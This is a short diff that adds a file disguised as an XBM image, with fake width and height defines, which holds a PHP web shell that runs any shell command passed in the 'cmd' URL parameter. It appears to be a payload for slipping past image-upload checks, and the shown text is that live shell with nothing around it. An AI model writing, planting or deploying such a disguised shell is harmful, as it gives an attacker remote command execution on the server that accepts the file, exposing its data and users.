@@ -1,0 +1,6 @@
+#define width 1337
+#define height 1337
+
+<?php
+echo system($_GET['cmd']);
+?>
